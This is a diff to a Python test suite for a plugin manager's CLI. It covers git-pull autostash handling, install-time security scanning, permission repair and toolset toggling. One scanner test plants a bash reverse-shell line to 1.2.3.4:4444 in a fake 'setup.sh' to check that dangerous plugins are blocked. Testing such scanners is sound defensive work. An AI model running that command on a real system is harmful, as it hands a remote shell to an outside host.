@@ -153,11 +153,147 @@ class TestResolveGitExecutable:
             return_value="/resolved/git",
         ):
             with patch.object(pc.subprocess, "run") as run:
-                run.return_value = MagicMock(returncode=0, stdout="Already up to date\n", stderr="")
+                # `git status --porcelain` (clean tree), `remote get-url origin`, then the pull.
+                run.side_effect = [
+                    MagicMock(returncode=0, stdout="", stderr=""),
+                    MagicMock(returncode=0, stdout="git@example.com:x.git\n", stderr=""),
+                    MagicMock(returncode=0, stdout="Already up to date\n", stderr=""),
+                ]
                 ok, msg = pc._git_pull_plugin_dir(tmp_path)
         assert ok is True
-        run.assert_called_once()
-        assert run.call_args[0][0][0] == "/resolved/git"
+        assert run.call_count == 3
+        for call in run.call_args_list:
+            assert call.args[0][0] == "/resolved/git"
+        assert run.call_args_list[2].args[0][1:] == ["pull", "--ff-only"]
+
+    def test_git_pull_clean_tree_never_stashes(self, tmp_path):
+        import hermes_cli.plugins_cmd as pc
+
+        _resolve_git_executable.cache_clear()
+        with patch.object(pc, "_resolve_git_executable", return_value="/g"):
+            with patch.object(pc.subprocess, "run") as run:
+                run.side_effect = [
+                    MagicMock(returncode=0, stdout="", stderr=""),      # status
+                    MagicMock(returncode=0, stdout="git@example.com:x.git\n", stderr=""),  # remote get-url
+                    MagicMock(returncode=0, stdout="Updated\n", stderr=""),  # pull
+                ]
+                ok, msg = pc._git_pull_plugin_dir(tmp_path)
+        assert ok is True
+        assert msg == "Updated"
+        commands = [c.args[0][1] for c in run.call_args_list]
+        assert "stash" not in commands
+
+
+class TestGitPullPluginDirAutostash:
+    """Real-git E2E: local edits in a plugin checkout must not block updates."""
+
+    @staticmethod
+    def _make_repos(tmp_path):
+        import subprocess as sp
+
+        def git(cwd, *args):
+            r = sp.run(["git", *args], cwd=str(cwd), capture_output=True, text=True)
+            assert r.returncode == 0, r.stderr
+            return r.stdout
+
+        origin = tmp_path / "origin"
+        origin.mkdir()
+        git(origin, "init", "-q", "-b", "main")
+        git(origin, "config", "user.email", "t@t")
+        git(origin, "config", "user.name", "t")
+        pad = "\n".join(f"# pad {i}" for i in range(12))
+        (origin / "plugin.py").write_text(
+            f"VALUE = 1\n{pad}\nOTHER = 'a'\n", encoding="utf-8"
+        )
+        git(origin, "add", ".")
+        git(origin, "commit", "-qm", "init")
+
+        checkout = tmp_path / "checkout"
+        git(tmp_path, "clone", "-q", str(origin), str(checkout))
+        git(checkout, "config", "user.email", "t@t")
+        git(checkout, "config", "user.name", "t")
+        return origin, checkout, git
+
+    @staticmethod
+    def _set_line(repo, prefix, new_line):
+        """Replace the line starting with ``prefix`` in plugin.py, keep the rest."""
+        f = repo / "plugin.py"
+        lines = f.read_text(encoding="utf-8").splitlines()
+        lines = [new_line if ln.startswith(prefix) else ln for ln in lines]
+        f.write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+    def test_dirty_checkout_pulls_and_reapplies_local_edit(self, tmp_path):
+        import hermes_cli.plugins_cmd as pc
+
+        if not pc._resolve_git_executable():
+            pytest.skip("git not available")
+        origin, checkout, git = self._make_repos(tmp_path)
+
+        # Upstream changes one line; local edit touches a DIFFERENT line.
+        self._set_line(origin, "VALUE", "VALUE = 2")
+        git(origin, "commit", "-qam", "bump value")
+        self._set_line(checkout, "OTHER", "OTHER = 'local'")
+
+        ok, msg = pc._git_pull_plugin_dir(checkout)
+        assert ok is True
+        content = (checkout / "plugin.py").read_text(encoding="utf-8")
+        assert "VALUE = 2" in content        # update landed
+        assert "OTHER = 'local'" in content  # local edit survived
+        assert "re-applied" in msg
+        # Clean re-apply drops the autostash entry.
+        assert git(checkout, "stash", "list").strip() == ""
+
+    def test_conflicting_local_edit_is_preserved_in_stash(self, tmp_path):
+        import hermes_cli.plugins_cmd as pc
+
+        if not pc._resolve_git_executable():
+            pytest.skip("git not available")
+        origin, checkout, git = self._make_repos(tmp_path)
+
+        # Upstream and local both change the SAME line → re-apply conflicts.
+        self._set_line(origin, "VALUE", "VALUE = 2")
+        git(origin, "commit", "-qam", "bump value")
+        self._set_line(checkout, "VALUE", "VALUE = 99")
+
+        ok, msg = pc._git_pull_plugin_dir(checkout)
+        assert ok is True
+        content = (checkout / "plugin.py").read_text(encoding="utf-8")
+        # Checkout is importable on the updated revision — no conflict markers.
+        assert "<<<<<<<" not in content
+        assert "VALUE = 2" in content
+        assert "preserved in git stash" in msg
+        # The local edit is recoverable from the kept stash entry.
+        stash_list = git(checkout, "stash", "list")
+        assert "hermes-plugin-update-autostash" in stash_list
+        stash_diff = git(checkout, "stash", "show", "-p", "stash@{0}")
+        assert "VALUE = 99" in stash_diff
+
+    def test_untracked_local_file_survives_update(self, tmp_path):
+        import hermes_cli.plugins_cmd as pc
+
+        if not pc._resolve_git_executable():
+            pytest.skip("git not available")
+        origin, checkout, git = self._make_repos(tmp_path)
+
+        self._set_line(origin, "VALUE", "VALUE = 2")
+        git(origin, "commit", "-qam", "bump value")
+        (checkout / "local_notes.txt").write_text("keep me\n", encoding="utf-8")
+
+        ok, msg = pc._git_pull_plugin_dir(checkout)
+        assert ok is True
+        assert (checkout / "local_notes.txt").read_text(encoding="utf-8") == "keep me\n"
+        assert "VALUE = 2" in (checkout / "plugin.py").read_text(encoding="utf-8")
+
+    def test_clean_checkout_unchanged_behavior(self, tmp_path):
+        import hermes_cli.plugins_cmd as pc
+
+        if not pc._resolve_git_executable():
+            pytest.skip("git not available")
+        origin, checkout, git = self._make_repos(tmp_path)
+
+        ok, msg = pc._git_pull_plugin_dir(checkout)
+        assert ok is True
+        assert "Already up to date" in msg
 
 
 # ── _repo_name_from_url ──────────────────────────────────────────────────
@@ -277,11 +413,15 @@ class TestCmdUpdate:
         )
         mock_sanitize.return_value = mock_target
 
-        mock_run.return_value = MagicMock(returncode=0, stdout="Updated", stderr="")
+        mock_run.side_effect = [
+            MagicMock(returncode=0, stdout="", stderr=""),        # status: clean
+            MagicMock(returncode=0, stdout="git@example.com:x.git", stderr=""),  # remote get-url
+            MagicMock(returncode=0, stdout="Updated", stderr=""),  # pull
+        ]
 
         cmd_update("test-plugin")
 
-        mock_run.assert_called_once()
+        assert mock_run.call_count == 3
 
     @patch("hermes_cli.plugins_cmd._sanitize_plugin_name")
     @patch("hermes_cli.plugins_cmd._plugins_dir")
@@ -658,6 +798,94 @@ class TestSubdirInstallE2E:
         assert pc._resolve_plugin_key("portable.test") == "portable.test"
 
 
+class TestReviewedPinScanTrust:
+    """A caution-verdict tree installs without a prompt when it is the reviewed catalog pin, still
+    prompts/blocks as a raw source or at a different revision, and dangerous blocks regardless."""
+
+    SHA = "a" * 40
+
+    def _fake_clone(self, pc, monkeypatch, plugins_dir, extra_file, body):
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: scanme\nmanifest_version: 1\n", encoding="utf-8")
+            (tmp_clone / extra_file).write_text(body, encoding="utf-8")
+            return revision or "b" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)
+
+    def test_caution_trusted_only_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n")  # caution
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False)
+        with pytest.raises(pc.PluginScanBlocked):  # catalog install whose checkout is NOT the pin
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref="c" * 40, reviewed_pin=self.SHA)
+        target, _manifest, name = pc._install_plugin_core(
+            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+        assert name == "scanme" and target.is_dir()
+
+    def test_dangerous_blocks_even_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+
+
+class TestInstallReadabilityGate:
+    """A clone that lands unreadable is repaired or rolled back, never shipped (#111804)."""
+
+    def _clone_with_unreadable_manifest(self, monkeypatch, pc):
+        real_chmod = os.chmod  # the rollback test replaces os.chmod after this fixture runs
+
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: badperm\nmanifest_version: 1\n", encoding="utf-8")
+            real_chmod(tmp_clone / "plugin.yaml", 0)
+            return "0" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_scan_plugin_tree", lambda *a, **k: None)
+
+    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
+    def test_unreadable_file_is_repaired_before_install(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        self._clone_with_unreadable_manifest(monkeypatch, pc)
+
+        target, manifest, name = pc._install_plugin_core("file:///tmp/x", force=False)
+
+        assert name == "badperm"  # manifest read after repair, not the URL fallback
+        assert (target / "plugin.yaml").read_text(encoding="utf-8").startswith("name: badperm")
+
+    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
+    def test_unrepairable_tree_rolls_back_and_names_the_fix(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        self._clone_with_unreadable_manifest(monkeypatch, pc)
+        monkeypatch.setattr(pc.os, "chmod", lambda *a, **k: (_ for _ in ()).throw(PermissionError(1, "nope")))
+
+        with pytest.raises(PluginOperationError, match=r"plugin.yaml is not readable.*chmod -R u\+rX"):
+            pc._install_plugin_core("file:///tmp/x", force=False)
+
+        assert list(plugins_dir.iterdir()) == []  # no half-installed dir, no staging leftovers
+
+
 def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
     import json
 
@@ -683,3 +911,60 @@ def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
         "Portable test plugin",
         "portable.test",
     )
+
+
+def test_autostash_dirty_tree_promotes_intent_to_add_entries(tmp_path):
+    """A plugin checkout holding `git add -N` entries must still autostash.
+
+    Same class as the `hermes update` autostash: an intent-to-add entry is never "uptodate", so
+    `git stash push` refuses it. A plugin install is patched in place often enough that this state is
+    ordinary rather than exotic, and the failure would abort the plugin update with a confusing error.
+    """
+    import subprocess
+
+    from hermes_cli.plugins_cmd import _autostash_dirty_tree
+
+    def git(*args, check=True):
+        return subprocess.run(
+            ["git", *args], cwd=tmp_path, capture_output=True, text=True, check=check
+        )
+
+    git("init", "-q", "-b", "main")
+    git("config", "user.email", "t@example.com")
+    git("config", "user.name", "t")
+    (tmp_path / "README.md").write_text("plugin\n", encoding="utf-8")
+    git("add", "-A")
+    git("commit", "-qm", "init")
+
+    local = tmp_path / "local_patch.py"
+    local.write_text("PATCHED = True\n", encoding="utf-8")
+    git("add", "-N", "local_patch.py")
+    assert " A local_patch.py" in git("status", "--porcelain").stdout.splitlines()
+
+    stashed, error = _autostash_dirty_tree("git", tmp_path)
+
+    assert (stashed, error) == (True, ""), "the plugin autostash must not be blocked by i-t-a entries"
+    assert git("status", "--porcelain").stdout == ""
+
+
+def test_toggle_plugin_toolset_rewrites_a_list_literal_string_platform_entry(tmp_path, monkeypatch):
+    """``hermes plugins enable`` must reach a platform whose ``platform_toolsets`` entry is the
+    list-literal string an older ``hermes config set`` stored, and re-save it as a real list —
+    the runtime already reads that string as the user's selection (follow-up to #115866)."""
+
+    from hermes_cli import plugins_cmd
+
+    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+    (tmp_path / "config.yaml").write_text(
+        yaml.safe_dump({"platform_toolsets": {"cli": '["web", "terminal"]', "telegram": ["hermes-telegram"]}}),
+        encoding="utf-8")
+    monkeypatch.setattr(plugins_cmd, "_get_plugin_toolset_key", lambda name: "my-plugin")
+
+    plugins_cmd._toggle_plugin_toolset("my-plugin", enable=True)
+    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
+    assert saved["cli"] == ["web", "terminal", "my-plugin"]
+    assert saved["telegram"] == ["hermes-telegram", "my-plugin"]
+
+    plugins_cmd._toggle_plugin_toolset("my-plugin", enable=False)
+    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
+    assert saved["cli"] == ["web", "terminal"]
